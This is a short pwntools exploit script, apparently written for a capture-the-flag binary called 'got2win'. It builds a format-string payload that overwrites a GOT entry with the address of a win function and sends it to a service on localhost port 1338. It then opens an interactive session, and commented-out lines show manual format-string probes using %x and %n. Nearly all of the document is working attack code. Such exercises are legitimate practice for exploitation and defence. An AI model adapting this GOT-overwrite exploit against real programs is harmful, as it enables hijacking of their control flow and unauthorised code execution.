#!/usr/bin/python3

from pwn import *

context.binary = binary = './got2win'

vuln_elf = ELF(binary)
vuln_rop = ROP(vuln_elf)
# libc = ELF(vuln_elf.runpath+b'/libc.so.6')

gs = '''
b *echo
b *printf
continue
'''

def start():
    if args.GDB:
        return gdb.debug(vuln_elf.path, gdbscript=gs)
    else:
        return process(vuln_elf.path)



# p = start()
p = remote('localhost',  1338)

p.recvuntil(b'> ')
got = 0x404018
win = 0x004012f4
payload = fmtstr_payload(6, {got:win}, write_size='byte')
# payload = p64(got)
# payload += b'%22$x'
# payload = b'%7$x'
# payload += b'%.987654d%n'
# payload = p64(got)
print(payload)
print(len(payload))
p.sendline(payload)


p.interactive()